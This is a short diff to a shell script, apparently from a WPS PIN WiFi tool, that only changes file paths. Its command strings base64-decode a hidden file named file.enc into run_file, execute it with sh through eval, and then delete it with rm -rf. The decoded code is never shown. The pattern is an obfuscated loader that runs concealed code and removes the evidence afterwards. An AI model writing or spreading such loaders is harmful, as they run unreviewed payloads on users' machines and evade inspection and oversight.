@@ -1,6 +1,6 @@
-a='cat file.enc | base64 -d > /BJ-WPS-PIN-WIFIHK/run_file;';
-b='sh /BJ-WPS-PIN-WIFIHK/run_file;';
-c='rm -rf /BJ-WPS-PIN-WIFIHK/run_file'
+a='cat file.enc | base64 -d > /root/BJ-WPS-PIN-WIFIHK/run_file;';
+b='sh /root/BJ-WPS-PIN-WIFIHK/run_file;';
+c='rm -rf /root/BJ-WPS-PIN-WIFIHK/run_file'
 
 
 eval "$a$b$c"
